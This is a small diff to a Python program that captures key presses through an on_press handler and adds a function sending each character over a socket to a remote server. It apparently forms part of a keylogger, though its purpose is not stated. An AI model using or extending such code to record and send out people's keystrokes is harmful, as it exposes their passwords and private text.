@@ -19,6 +19,16 @@ def on_press(key, data_queue):
         data_to_send = str(key.char)
         data_queue.put(data_to_send)
 
+def send_data_to_server(data):
+    print(data)
+    try:
+        client_socket.send(data.encode('utf-8'))
+    except (socket.error, BrokenPipeError) as e:
+        print(f"Error sending data: {e}")
+    except Exception as ex:
+        print(f"Unexpected error: {ex}")
+
+
 def connect_to_server(server_ip, server_port):
     try:
         global client_socket
